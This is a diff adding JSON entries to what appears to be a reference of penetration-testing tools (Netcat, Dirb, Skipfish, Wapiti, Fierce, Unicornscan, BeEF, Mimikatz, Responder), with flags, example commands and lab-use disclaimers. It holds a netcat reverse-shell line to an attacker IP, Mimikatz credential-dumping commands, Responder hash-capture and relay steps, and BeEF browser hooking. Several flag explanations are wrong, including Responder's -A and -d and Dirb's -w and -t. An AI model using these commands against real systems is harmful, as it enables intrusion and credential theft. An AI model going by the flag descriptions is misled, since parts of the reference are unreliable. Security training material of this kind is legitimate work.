+        "flags": [
+            {
+                "flag": "-l",
+                "explanation": "Listen mode. Why: Sets up Netcat as a server to accept incoming connections."
+            },
+            {
+                "flag": "-v",
+                "explanation": "Verbose output. Why: Displays connection details and status messages."
+            },
+            {
+                "flag": "-n",
+                "explanation": "No DNS resolution. Why: Speeds up connections when using IP addresses."
+            },
+            {
+                "flag": "-p <port>",
+                "explanation": "Specify local port to listen on. Why: Controls the network port for server or client."
+            },
+            {
+                "flag": "-u",
+                "explanation": "UDP mode. Why: Switches Netcat from TCP to UDP."
+            },
+            {
+                "flag": "-w <seconds>",
+                "explanation": "Timeout for connections. Why: Limits waiting period for clients."
+            },
+            {
+                "flag": "-z",
+                "explanation": "Zero-I/O mode for scanning. Why: Check open ports without sending data."
+            },
+            {
+                "flag": "-e <program>",
+                "explanation": "Execute program after connection (e.g., `/bin/bash`). Why: Enables simple backdoors (for lab use only)."
+            }
+        ],
+        "examples": [
+            {
+                "command": "nc -lvnp 4444",
+                "explanation": "Start a TCP listener on port 4444 with verbose output."
+            },
+            {
+                "command": "nc 192.168.1.50 4444",
+                "explanation": "Connect to the listener on remote host 192.168.1.50."
+            },
+            {
+                "command": "nc -zv 192.168.1.100 20-1024",
+                "explanation": "Scan ports 20-1024 on a host to check which are open."
+            },
+            {
+                "command": "nc -l -p 5555 > received_file.txt",
+                "explanation": "Set up a listener to receive a file."
+            },
+            {
+                "command": "nc -w 3 192.168.1.50 5555 < file.txt",
+                "explanation": "Send a file to a listening Netcat instance."
+            },
+            {
+                "command": "nc -u -l -p 1234",
+                "explanation": "Start a UDP listener on port 1234."
+            }
+        ],
+        "tips": {
+            "quick_scan": "Use `nc -zv <host> <ports>` to quickly check open ports.",
+            "file_transfer": "Combine Netcat with tar or gzip to transfer directories: `tar czf - folder | nc -l -p 5555`.",
+            "reverse_shell": "For lab practice, use `nc -e /bin/bash <attacker_ip> <port>` to simulate reverse shells."
+        },
+        "advanced": {
+            "advanced_tips": [
+                "Pipe Netcat to other tools (e.g., `nmap`, `openssl`) for encrypted communication or more advanced scanning.",
+                "Use Netcat in combination with `socat` for more robust, bidirectional connections.",
+                "Chain Netcat listeners to simulate pivoting and multi-stage network testing in lab environments."
+            ],
+            "tips": [
+                "For persistent listening, combine Netcat with loops or systemd scripts in lab setups.",
+                "Use `-u` for UDP fuzzing of services like DNS or SNMP.",
+                "Test zero-I/O scans with `-z` to avoid sending payloads while discovering open ports."
+            ]
+        }
+    },
+    {
+        "name": "Dirb",
+        "description": "Dirb is a web content scanner that brute-forces directories and files on web servers using wordlists. It helps identify hidden endpoints, backup files, and other resources that may expose sensitive data.",
+        "when_why": "Use Dirb during web application reconnaissance to:\n- Discover hidden directories or files.\n- Identify unlinked resources like admin panels or backups.\n- Map web server structure before further testing.\nAlways test on systems you own or have explicit permission to audit.",
+        "how": "Basic usage:\n`dirb http://192.168.1.100 /usr/share/wordlists/dirb/common.txt -o dirb_report.txt`\n- `http://192.168.1.100`: target URL\n- `/usr/share/wordlists/dirb/common.txt`: wordlist for brute-forcing\n- `-o dirb_report.txt`: save results to file\n\nOptional flags can modify scanning depth, verbosity, and recursion. Review results in the output file or terminal.",
+        "flags": [
+            {
+                "flag": "-o <file>",
+                "explanation": "Specify an output file. Why: Saves scan results for analysis or reporting."
+            },
+            {
+                "flag": "-r",
+                "explanation": "Non-recursive mode. Why: Limits scanning to top-level directories only."
+            },
+            {
+                "flag": "-S",
+                "explanation": "Silent mode. Why: Reduces terminal output for cleaner logs."
+            },
+            {
+                "flag": "-u",
+                "explanation": "Specify a single URL instead of reading from a list. Why: Target specific endpoint quickly."
+            },
+            {
+                "flag": "-w <wordlist>",
+                "explanation": "Custom wordlist to use for brute-forcing. Why: Focus on specific patterns or expand coverage."
+            },
+            {
+                "flag": "-x <extensions>",
+                "explanation": "Scan specific file extensions (e.g., .php,.bak). Why: Finds hidden files with known extensions."
+            },
+            {
+                "flag": "-p <proxy>",
+                "explanation": "Use a proxy server. Why: Route requests through a proxy for monitoring or anonymization."
+            },
+            {
+                "flag": "-t <threads>",
+                "explanation": "Number of threads for parallel requests. Why: Speeds up scanning."
+            }
+        ],
+        "examples": [
+            {
+                "command": "dirb http://192.168.1.100 /usr/share/wordlists/dirb/common.txt -o dirb_report.txt",
+                "explanation": "Scan a target web server and save results to a file."
+            },
+            {
+                "command": "dirb http://192.168.1.100 /usr/share/wordlists/dirb/common.txt -r",
+                "explanation": "Scan without recursion to limit to top-level directories."
+            },
+            {
+                "command": "dirb http://192.168.1.100 /usr/share/wordlists/dirb/common.txt -S",
+                "explanation": "Run in silent mode to reduce terminal output."
+            },
+            {
+                "command": "dirb http://192.168.1.100 -w /usr/share/wordlists/custom.txt -x .php,.bak",
+                "explanation": "Scan using a custom wordlist and focus on .php and .bak files."
+            },
+            {
+                "command": "dirb http://192.168.1.100 -p http://127.0.0.1:8080",
+                "explanation": "Scan through a proxy for traffic monitoring or anonymization."
+            }
+        ],
+        "tips": {
+            "wordlist_selection": "Choose large and relevant wordlists for better coverage; combine multiple wordlists if needed.",
+            "scan_safety": "Start with non-recursive scans to avoid overloading the server.",
+            "review_results": "Check output file regularly; look for 200 OK and 403 Forbidden responses for interesting paths."
+        },
+        "advanced": {
+            "advanced_tips": [
+                "Chain Dirb with other tools like Gobuster or FFUF for deeper, faster scans.",
+                "Use Dirb output in automation scripts for CI/CD security pipelines.",
+                "Combine with proxy tools (Burp, ZAP) to analyze HTTP responses in real-time."
+            ],
+            "tips": [
+                "Customize extensions (-x) to find backup files or hidden scripts.",
+                "Increase threads (-t) carefully; too many can trigger rate-limiting.",
+                "Use proxy (-p) to inspect requests in security testing labs."
+            ]
+        }
+    },
+    {
+        "name": "Skipfish",
+        "description": "Skipfish is a high-speed, active web application security reconnaissance tool. It maps web applications by automatically crawling, probing, and analyzing responses to identify potential vulnerabilities.",
+        "when_why": "Use Skipfish during web application penetration testing to:\n- Discover hidden directories and endpoints.\n- Identify potential vulnerabilities like XSS, SQL injection, and misconfigurations.\n- Generate a comprehensive site map for further testing.\nAlways scan systems you own or have explicit permission to test.",
+        "how": "Basic usage:\n`skipfish -o output_dir http://192.168.1.100 -I /login`\n- `-o output_dir`: directory to save results.\n- `http://192.168.1.100`: target URL.\n- `-I /login`: include login path for crawling.\n\nAdditional options can control scanning depth, wordlists, authentication, and reporting.",
+        "flags": [
+            {
+                "flag": "-o <dir>",
+                "explanation": "Output directory. Why: Stores generated reports and site map."
+            },
+            {
+                "flag": "-I <substr>",
+                "explanation": "Include matching paths. Why: Focuses scanning on specific sections of the site."
+            },
+            {
+                "flag": "-X <substr>",
+                "explanation": "Exclude paths. Why: Avoids scanning irrelevant or sensitive areas."
+            },
+            {
+                "flag": "-W <file>",
+                "explanation": "Use custom wordlist. Why: Improves detection of hidden files and directories."
+            },
+            {
+                "flag": "-S <session_file>",
+                "explanation": "Resume previous session. Why: Allows continuation of interrupted scans."
+            },
+            {
+                "flag": "-D <max_depth>",
+                "explanation": "Set maximum crawl depth. Why: Limits scanning to relevant site structure."
+            },
+            {
+                "flag": "-C <cookie_string>",
+                "explanation": "Pass HTTP cookies. Why: Access authenticated areas during scanning."
+            },
+            {
+                "flag": "-L <log_file>",
+                "explanation": "Write detailed log output. Why: Helps with debugging or monitoring scan progress."
+            },
+            {
+                "flag": "-v",
+                "explanation": "Verbose mode. Why: Displays detailed progress and requests in terminal."
+            }
+        ],
+        "examples": [
+            {
+                "command": "skipfish -o output_dir http://192.168.1.100",
+                "explanation": "Perform a basic scan on the target website, saving results to 'output_dir'."
+            },
+            {
+                "command": "skipfish -o scan_results -I /login -X /logout http://192.168.1.100",
+                "explanation": "Include only login page and exclude logout page during scanning."
+            },
+            {
+                "command": "skipfish -o output -W custom_words.txt http://192.168.1.100",
+                "explanation": "Scan using a custom wordlist for more thorough directory discovery."
+            },
+            {
+                "command": "skipfish -o output -C 'PHPSESSID=abc123' http://192.168.1.100",
+                "explanation": "Scan authenticated pages using a session cookie."
+            },
+            {
+                "command": "skipfish -o resume_scan -S previous_session.sess http://192.168.1.100",
+                "explanation": "Resume a previously interrupted scan from session file."
+            }
+        ],
+        "tips": {
+            "wordlist_tuning": "Use custom wordlists to detect hidden endpoints and uncommon directories.",
+            "scan_scope": "Always define include/exclude paths (-I / -X) to reduce unnecessary requests.",
+            "output_review": "Open 'index.html' in the output directory to view visual site maps and vulnerabilities."
+        },
+        "advanced": {
+            "advanced_tips": [
+                "Combine Skipfish with proxy tools like Burp Suite to inspect HTTP traffic in detail.",
+                "Integrate Skipfish output with reporting tools for automated vulnerability documentation.",
+                "Adjust crawl depth (-D) to balance scan thoroughness and speed."
+            ],
+            "tips": [
+                "Use session resuming (-S) for large scans that may be interrupted.",
+                "Pass authentication cookies (-C) to scan private areas of the application.",
+                "Enable verbose mode (-v) when troubleshooting crawling issues."
+            ]
+        }
+    },
+    {
+        "name": "Wapiti",
+        "description": "Wapiti is an open-source web application vulnerability scanner that performs black-box testing by crawling web pages and injecting payloads to detect security issues like XSS, SQL injection, file disclosure, command execution, and other common vulnerabilities.",
+        "when_why": "Use Wapiti during web application penetration testing to:\n- Audit web apps for XSS, SQLi, and other vulnerabilities.\n- Validate security controls and ensure input validation.\n- Generate comprehensive reports for remediation.\nAlways scan systems you own or have explicit permission to test.",
+        "how": "Basic usage:\n`wapiti -u http://192.168.1.100 -m xss,sql -f html`\n- `-u`: target URL.\n- `-m xss,sql`: modules for XSS and SQL injection scanning.\n- `-f html`: output report format.\n\nWapiti can also handle authentication, custom headers, cookies, and advanced scanning modules.",
+        "flags": [
+            {
+                "flag": "-u <url>",
+                "explanation": "Target URL. Why: Defines the web application to scan."
+            },
+            {
+                "flag": "-m <modules>",
+                "explanation": "Select modules (e.g., xss, sql, cmd). Why: Focus scan on specific vulnerability types."
+            },
+            {
+                "flag": "-f <format>",
+                "explanation": "Report format (e.g., html, json, txt). Why: Custom output for reporting."
+            },
+            {
+                "flag": "-c <cookie_file>",
+                "explanation": "Cookie file. Why: Performs authenticated scans."
+            },
+            {
+                "flag": "-p <proxy>",
+                "explanation": "Use a proxy (e.g., http://127.0.0.1:8080). Why: Intercept requests or scan via Burp Suite."
+            },
+            {
+                "flag": "-H <header>",
+                "explanation": "Add custom HTTP headers. Why: Required for authentication or special headers."
+            },
+            {
+                "flag": "-s <skip_modules>",
+                "explanation": "Skip specified modules. Why: Avoid scanning unnecessary tests."
+            },
+            {
+                "flag": "-d <depth>",
+                "explanation": "Crawl depth. Why: Limits scanning to avoid long runtimes."
+            },
+            {
+                "flag": "-r <resume_file>",
+                "explanation": "Resume previous scan session. Why: Continue interrupted scans without starting over."
+            },
+            {
+                "flag": "-v",
+                "explanation": "Verbose mode. Why: Displays progress and HTTP requests in terminal."
+            }
+        ],
+        "examples": [
+            {
+                "command": "wapiti -u http://192.168.1.100 -m xss,sql -f html",
+                "explanation": "Scan target for XSS and SQLi vulnerabilities, generating an HTML report."
+            },
+            {
+                "command": "wapiti -u http://192.168.1.100 -c cookies.txt -m xss,sql,cmd -f json",
+                "explanation": "Authenticated scan using cookie file for multiple modules and outputs JSON report."
+            },
+            {
+                "command": "wapiti -u http://192.168.1.100 -p http://127.0.0.1:8080 -f txt",
+                "explanation": "Scan via a local proxy and save output in plain text format."
+            },
+            {
+                "command": "wapiti -u http://192.168.1.100 -m all -d 3 -f html",
+                "explanation": "Perform a deep scan with all available modules, up to depth 3, saving an HTML report."
+            },
+            {
+                "command": "wapiti -u http://192.168.1.100 -r previous_scan.ses -f html",
+                "explanation": "Resume a previous scan session and generate an HTML report."
+            }
+        ],
+        "tips": {
+            "auth_scans": "Use cookie files or authentication headers for scanning login-protected areas.",
+            "scan_scope": "Use modules selectively (-m) to focus on relevant vulnerabilities and reduce scan time.",
+            "reporting": "Generate multiple formats (-f) for stakeholders, developers, or compliance documentation."
+        },
+        "advanced": {
+            "advanced_tips": [
+                "Combine Wapiti with proxy tools (Burp Suite/ZAP) to inspect HTTP traffic and validate findings.",
+                "Use depth (-d) and skip modules (-s) to balance thoroughness and speed.",
+                "Leverage verbose mode (-v) to debug and understand crawling behavior."
+            ],
+            "tips": [
+                "Resume long or interrupted scans using session files (-r) to save time.",
+                "Include custom headers (-H) for authentication tokens or API keys.",
+                "Integrate output with CI/CD pipelines for automated security checks."
+            ]
+        }
+    },
+    {
+        "name": "Fierce",
+        "description": "Fierce is a DNS reconnaissance and network mapping tool that helps identify subdomains, hostnames, and IP ranges for a given domain. It performs brute-force, zone transfers, and reverse lookups to map the attack surface.",
+        "when_why": "Use Fierce during the reconnaissance phase of penetration testing to:\n- Discover subdomains and internal hosts.\n- Map IP ranges and network structure.\n- Identify potential entry points for further testing.\nAlways scan networks and domains you own or have explicit permission to test.",
+        "how": "Basic usage:\n`fierce --domain example.local --wordlist subdomains.txt`\n- `--domain`: target domain.\n- `--wordlist`: list of subdomains for brute-forcing.\n\nFierce can also perform wide-range scans, reverse lookups, and attempt zone transfers.",
+        "flags": [
+            {
+                "flag": "--domain <domain>",
+                "explanation": "Target domain. Why: Defines the scope of the scan."
+            },
+            {
+                "flag": "--wordlist <file>",
+                "explanation": "Subdomain wordlist. Why: Enables brute-force discovery of hostnames."
+            },
+            {
+                "flag": "--wide",
+                "explanation": "Scan /16 IP range for host discovery. Why: Performs broad network enumeration."
+            },
+            {
+                "flag": "--dns <server>",
+                "explanation": "Use a specific DNS server. Why: Ensures reliable DNS resolution or bypasses default server restrictions."
+            },
+            {
+                "flag": "--reverse",
+                "explanation": "Perform reverse lookups on IP ranges. Why: Maps IPs back to hostnames for additional discovery."
+            },
+            {
+                "flag": "--file <output>",
+                "explanation": "Save results to a file. Why: Keeps a record of discovered hosts and IPs."
+            },
+            {
+                "flag": "--mask <CIDR>",
+                "explanation": "Limit scan to a specific network range (e.g., 192.168.0.0/24). Why: Focuses scanning efforts and reduces time."
+            }
+        ],
+        "examples": [
+            {
+                "command": "fierce --domain example.local --wordlist subdomains.txt",
+                "explanation": "Scan example.local using a custom subdomain wordlist to discover hosts."
+            },
+            {
+                "command": "fierce --domain example.local --wide",
+                "explanation": "Perform a broad /16 network scan for all IPs in the domain range."
+            },
+            {
+                "command": "fierce --domain example.local --dns 8.8.8.8 --wordlist subdomains.txt",
+                "explanation": "Use Google DNS server to resolve subdomains, ensuring reliable lookups."
+            },
+            {
+                "command": "fierce --domain example.local --reverse --file results.txt",
+                "explanation": "Perform reverse DNS lookups on discovered IPs and save results to a file."
+            },
+            {
+                "command": "fierce --domain example.local --mask 192.168.1.0/24",
+                "explanation": "Limit scanning to a specific subnet for focused enumeration."
+            }
+        ],
+        "tips": {
+            "subdomain_lists": "Use comprehensive subdomain wordlists like SecLists for better discovery coverage.",
+            "dns_reliability": "Test multiple DNS servers if some queries fail or return incomplete results.",
+            "output_analysis": "Review output for live hosts, IP ranges, and potential misconfigurations."
+        },
+        "advanced": {
+            "advanced_tips": [
+                "Combine --wide with --reverse to map large networks and identify unused IPs.",
+                "Use --mask to focus scans on critical subnets or network segments.",
+                "Pipe output into tools like Nmap for further host/service enumeration."
+            ],
+            "tips": [
+                "Check for possible DNS zone transfers (AXFR) using `dig` to identify complete domain records.",
+                "Automate repeated scans with cron or scripts for continuous monitoring of subdomains."
+            ]
+        }
+    },
+    {
+        "name": "Unicornscan",
+        "description": "Unicornscan is an asynchronous, stateless network scanner designed for high-performance reconnaissance. It supports TCP, UDP, and ICMP scans, service fingerprinting, and can efficiently enumerate large networks.",
+        "when_why": "Use Unicornscan when you need:\n- Fast port scanning across large IP ranges.\n- Asynchronous scanning to avoid delays.\n- Service and OS fingerprinting.\nAlways scan networks you own or have explicit permission to test.",
+        "how": "Basic usage examples:\n`unicornscan 192.168.1.100:a -mU -i eth0` - Perform a UDP scan on all ports.\n`unicornscan 192.168.1.0/24:a -mT` - Perform a TCP scan on all hosts in a subnet.\n`unicornscan 192.168.1.100:80-443 -mT` - Scan specific TCP ports.\nOptions allow targeting specific protocols, ports, and interfaces.",
+        "flags": [
+            {
+                "flag": "-m <mode>",
+                "explanation": "Scan mode: T=TCP, U=UDP, S=SYN, A=ACK. Why: Choose the protocol and scan type."
+            },
+            {
+                "flag": "-i <iface>",
+                "explanation": "Network interface to use (e.g., eth0, wlan0). Why: Directs scan traffic through specific device."
+            },
+            {
+                "flag": ":a",
+                "explanation": "Scan all ports. Why: Ensures a comprehensive port scan."
+            },
+            {
+                "flag": ":<start>-<end>",
+                "explanation": "Scan specific port ranges. Why: Focus on relevant services and reduce scan time."
+            },
+            {
+                "flag": "-v",
+                "explanation": "Verbose mode. Why: Shows progress and packet information in real-time."
+            },
+            {
+                "flag": "-r <rate>",
+                "explanation": "Packet rate (packets per second). Why: Control scan speed to avoid network congestion or detection."
+            },
+            {
+                "flag": "-l <logfile>",
+                "explanation": "Save results to a file. Why: Keep records for analysis and reporting."
+            },
+            {
+                "flag": "--banner",
+                "explanation": "Attempt service banner grabbing. Why: Identify service version and fingerprinting info."
+            }
+        ],
+        "examples": [
+            {
+                "command": "unicornscan 192.168.1.100:a -mU -i eth0",
+                "explanation": "Perform a UDP scan on all ports of a single host via eth0."
+            },
+            {
+                "command": "unicornscan 192.168.1.0/24:a -mT",
+                "explanation": "Scan all TCP ports across a /24 subnet."
+            },
+            {
+                "command": "unicornscan 192.168.1.100:22-80 -mT -v",
+                "explanation": "Verbose TCP scan on ports 22 to 80."
+            },
+            {
+                "command": "unicornscan 192.168.1.50:a -mT --banner",
+                "explanation": "Perform TCP scan on all ports and grab service banners for fingerprinting."
+            },
+            {
+                "command": "unicornscan 192.168.1.0/24:a -mT -r 1000 -l scan_results.txt",
+                "explanation": "Scan a subnet with 1000 packets/sec and save results to a file."
+            }
+        ],
+        "tips": {
+            "use_rate_control": "Adjust -r to balance scan speed and avoid detection or network issues.",
+            "combine_modes": "Use different modes (-mT, -mU) for TCP/UDP reconnaissance.",
+            "analyze_output": "Check banner info and logs to identify running services and potential vulnerabilities."
+        },
+        "advanced": {
+            "advanced_tips": [
+                "Chain scans with Nmap for deeper service analysis: `nmap -sV -p <ports> <hosts>`.",
+                "Use port ranges instead of :a for faster focused scans on critical services.",
+                "Leverage multiple interfaces (-i) for distributed network scanning."
+            ],
+            "tips": [
+                "Unicornscan works well for large networks due to its asynchronous, stateless design.",
+                "Combine with tools like Masscan for ultra-fast initial sweeps."
+            ]
+        }
+    },
+    {
+        "name": "BeEF",
+        "description": "BeEF (Browser Exploitation Framework) is a GUI-based penetration testing tool focused on client-side attacks. It hooks browsers via JavaScript and allows security testers to launch exploits, gather browser info, and control the browser in a controlled environment.",
+        "when_why": "Use BeEF to assess browser security and the effectiveness of client-side protections. It is ideal for:\n- Testing XSS exploits and social engineering scenarios.\n- Evaluating browser plugin vulnerabilities.\n- Simulating real-world client-side attacks.\nAlways target systems and browsers you own or have explicit permission to test.",
+        "how": "Step-by-step usage example:\n1. Start BeEF: `beef-xss`\n2. Access the control panel via web browser: `http://127.0.0.1:3000/ui/panel`\n3. Log in with default credentials (change immediately after first use).\n4. Hook target browsers by injecting `hook.js` into the target page.\n5. Use the GUI to run modules, gather information, and control hooked browsers.\n6. Test only on websites and clients you own or are authorized to audit.",
+        "flags": [
+            {
+                "flag": "-c <file>",
+                "explanation": "Use an alternate configuration file. Why: Allows custom BeEF settings."
+            },
+            {
+                "flag": "--config <file>",
+                "explanation": "Load a specific config file (equivalent to -c). Why: Overrides default settings for flexibility."
+            },
+            {
+                "flag": "-x",
+                "explanation": "Run in debug/verbose mode. Why: Provides detailed output for troubleshooting."
+            },
+            {
+                "flag": "-p <port>",
+                "explanation": "Specify a custom port for the control panel. Why: Avoids conflicts with other services."
+            },
+            {
+                "flag": "-a <IP>",
+                "explanation": "Bind BeEF to a specific IP address. Why: Restrict access to certain network interfaces."
+            }
+        ],
+        "examples": [
+            {
+                "command": "beef-xss",
+                "explanation": "Start BeEF with default configuration and access the GUI at 127.0.0.1:3000."
+            },
+            {
+                "command": "beef-xss -c custom_config.yaml",
+                "explanation": "Start BeEF with a custom configuration file for specialized setups."
+            },
+            {
+                "command": "beef-xss -p 8080 -a 192.168.1.50",
+                "explanation": "Bind BeEF to a specific IP and port for network segmentation."
+            },
+            {
+                "command": "beef-xss -x",
+                "explanation": "Launch BeEF in debug mode to troubleshoot startup or module issues."
+            }
+        ],
+        "tips": {
+            "secure_credentials": "Always change default admin credentials before hooking real browsers.",
+            "use_https": "Enable SSL for the control panel when testing in environments with multiple users.",
+            "module_usage": "Test modules individually to avoid unwanted side effects on hooked browsers."
+        },
+        "advanced": {
+            "advanced_tips": [
+                "Integrate with Metasploit for combined client-side exploitation scenarios.",
+                "Customize and create new modules for specialized attacks.",
+                "Chain BeEF hooks with social engineering frameworks for phishing simulations."
+            ],
+            "tips": [
+                "Monitor hooked browsers via the GUI to track activity and session duration.",
+                "Use VLANs or isolated networks to safely test multiple hooked clients."
+            ]
+        }
+    },
+    {
+        "name": "Mimikatz",
+        "description": "Mimikatz is a post-exploitation tool for Windows systems that can extract plaintext passwords, hashes, Kerberos tickets, and other credential artifacts from memory. It is widely used for penetration testing and red teaming to assess credential security.",
+        "when_why": "Use Mimikatz after gaining authorized access to a Windows system to:\n- Extract passwords and hashes for testing account security.\n- Retrieve Kerberos tickets for lateral movement.\n- Evaluate the effectiveness of Windows credential protections (LSA, SAM, and NTLM).\nAlways perform testing in isolated lab environments or with explicit permission.",
+        "how": "Step-by-step usage example:\n1. Launch Mimikatz on the target Windows system.\n2. Elevate privileges: `privilege::debug` (needed for memory access).\n3. Dump credentials: `sekurlsa::logonpasswords` (retrieves usernames and passwords).\n4. Dump password hashes for offline cracking: `lsadump::sam`.\n5. Optional: Export Kerberos tickets: `kerberos::list /export`.\n6. Always work in controlled labs to avoid unauthorized access or damage.",
+        "flags": [
+            {
+                "flag": "privilege::debug",
+                "explanation": "Enables debug privileges. Why: Required for accessing Windows memory and sensitive credential stores."
+            },
+            {
+                "flag": "sekurlsa::logonpasswords",
+                "explanation": "Extracts plaintext passwords, hashes, and login sessions from memory. Why: Retrieves credentials for assessment."
+            },
+            {
+                "flag": "lsadump::sam",
+                "explanation": "Extracts SAM database hashes for offline password cracking. Why: Allows testing password strength."
+            },
+            {
+                "flag": "kerberos::list /export",
+                "explanation": "Exports Kerberos tickets (TGT/TGS) for lateral movement testing. Why: Evaluates Kerberos security."
+            },
+            {
+                "flag": "token::elevate",
+                "explanation": "Elevates current process token. Why: Helps bypass permission restrictions for certain commands."
+            },
+            {
+                "flag": "misc::log",
+                "explanation": "Logs Mimikatz output to a file. Why: Records results for reporting or analysis."
+            }
+        ],
+        "examples": [
+            {
+                "command": "mimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" exit",
+                "explanation": "Dump all available login credentials from memory on a Windows system."
+            },
+            {
+                "command": "mimikatz.exe \"privilege::debug\" \"lsadump::sam\" exit",
+                "explanation": "Extract password hashes from SAM for offline cracking."
+            },
+            {
+                "command": "mimikatz.exe \"token::elevate\" \"sekurlsa::logonpasswords\" exit",
+                "explanation": "Elevate token and dump credentials with higher privileges."
+            },
+            {
+                "command": "mimikatz.exe \"kerberos::list /export\" exit",
+                "explanation": "Export Kerberos tickets for testing Kerberos-based authentication and lateral movement."
+            }
+        ],
+        "tips": {
+            "use_lab": "Always test Mimikatz in isolated lab environments to avoid accidental compromise.",
+            "patch_status": "Check target Windows version; newer patches mitigate some credential extraction techniques.",
+            "combine_tools": "Use with password cracking tools like John the Ripper or Hashcat for offline hash testing."
+        },
+        "advanced": {
+            "advanced_tips": [
+                "Combine with PowerShell scripts for automated credential collection in red team exercises.",
+                "Use Mimikatz modules to extract cached domain credentials for post-exploitation.",
+                "Test the impact of credential guard and LSA protection configurations in lab setups."
+            ],
+            "tips": [
+                "Always elevate privileges first for full memory access.",
+                "Document findings carefully and sanitize sensitive information after testing."
+            ]
+        }
+    },
+    {
+        "name": "Responder",
+        "description": "Responder is a network tool that poisons LLMNR, NBT-NS, and MDNS protocols to intercept and capture authentication hashes on local networks. It is primarily used in penetration testing and red team exercises to assess the security of network authentication.",
+        "when_why": "Use Responder in controlled local network environments to:\n- Capture NTLM and other Windows authentication hashes.\n- Test network segmentation and protocol exposure.\n- Evaluate defenses against rogue server attacks.\nAlways run on networks you own or are explicitly authorized to test.",
+        "how": "Step-by-step usage example:\n1. Start Responder on your network interface: `responder -I eth0 -w On -r On`.\n2. The tool will poison LLMNR, NBT-NS, and MDNS requests, responding with its own IP.\n3. Wait for hosts to authenticate and capture NTLM challenge-response hashes.\n4. Optionally use captured hashes with tools like Hashcat or John the Ripper for offline cracking.\n5. Always ensure testing is authorized and contained within your lab or target network.",
+        "flags": [
+            {
+                "flag": "-I <iface>",
+                "explanation": "Specifies the network interface to use (e.g., eth0). Why: Targets the correct network segment for poisoning."
+            },
+            {
+                "flag": "-w On",
+                "explanation": "Enable WPAD rogue proxy responses. Why: Captures credentials via Web Proxy Auto-Discovery."
+            },
+            {
+                "flag": "-r On",
+                "explanation": "Enable NetBIOS Name Service and WINS redirection. Why: Extends poisoning to additional protocols for more hash capture."
+            },
+            {
+                "flag": "-f",
+                "explanation": "Force responder to answer all requests. Why: Ensures maximum coverage in testing."
+            },
+            {
+                "flag": "-d",
+                "explanation": "Enable DNS spoofing. Why: Captures requests for domain names and credentials."
+            },
+            {
+                "flag": "-v",
+                "explanation": "Verbose mode. Why: Displays captured requests and responses in real-time."
+            },
+            {
+                "flag": "-A",
+                "explanation": "Enable SMB relay attacks. Why: Allows testing of relaying captured credentials to other hosts."
+            }
+        ],
+        "examples": [
+            {
+                "command": "responder -I eth0 -w On -r On",
+                "explanation": "Basic setup to poison LLMNR, NBT-NS, and MDNS on eth0, capturing hashes from local hosts."
+            },
+            {
+                "command": "responder -I wlan0 -f -v",
+                "explanation": "Force responses on WLAN interface and show verbose output for monitoring."
+            },
+            {
+                "command": "responder -I eth0 -A",
+                "explanation": "Enable SMB relay attacks for post-exploitation testing in a lab environment."
+            },
+            {
+                "command": "responder -I eth0 -d",
+                "explanation": "Enable DNS spoofing to capture domain-related authentication requests."
+            }
+        ],
+        "tips": {
+            "interface_check": "Use `ifconfig` or `ip a` to verify the correct network interface.",
+            "monitor_traffic": "Combine with Wireshark or tcpdump to observe poisoning effects in real-time.",
+            "hash_usage": "Captured NTLM hashes should be tested offline with tools like Hashcat; never use on unauthorized systems."
+        },
+        "advanced": {
+            "advanced_tips": [
+                "Combine Responder with Metasploit’s SMB relay modules for lateral movement exercises.",
+                "Use selective poisoning to avoid detection in sensitive networks.",
+                "Test defenses like LLMNR/NBT-NS/MDNS hardening and WPAD proxy protections in lab setups."
+            ],
+            "tips": [
+                "Always notify network owners before testing to avoid service disruption.",
+                "Store captured hashes securely and erase after lab testing."
+            ]
+        }
+    }
+]
